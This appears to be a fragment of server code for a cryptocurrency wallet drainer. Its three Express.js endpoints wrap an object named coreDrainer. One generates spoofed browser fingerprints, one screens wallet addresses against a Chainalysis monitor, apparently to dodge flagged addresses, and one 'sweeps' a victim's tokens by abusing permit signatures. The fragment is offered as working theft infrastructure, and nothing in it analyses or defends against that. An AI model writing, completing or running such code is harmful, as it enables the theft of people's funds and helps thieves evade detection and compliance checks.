// CORRECTED Fingerprint Endpoint
app.post('/api/fingerprint/generate', async (req, res) => {
    try {
        const { sessionId, profileType } = req.body;
        const fingerprint = await coreDrainer.fingerprintSpoofer.generateSpoofedFingerprint(
            sessionId || 'session_' + Date.now(), 
            profileType || 'chrome_windows'
        );
        res.json({ success: true, fingerprint });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// CORRECTED Security Screening Endpoint
app.post('/api/security/screen', async (req, res) => {
    try {
        const { address, intensity } = req.body;
        
        if (!address) {
            return res.json({ success: false, error: 'Address required' });
        }
        
        const screening = await coreDrainer.chainalysisMonitor.screenAddress(
            address, 
            intensity || 'standard'
        );
        res.json({ success: true, screening });
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});

// CORRECTED Permit Sweep Endpoint
app.post('/api/permit/sweep', async (req, res) => {
    try {
        const { userAddress, tokenAddress, tokenName, tokenVersion } = req.body;
        const result = await coreDrainer.sweepViaPermit(
            userAddress, 
            tokenAddress || 'all',
            tokenName || 'Token',
            tokenVersion || '1'
        );
        res.json(result);
    } catch (error) {
        res.json({ success: false, error: error.message });
    }
});
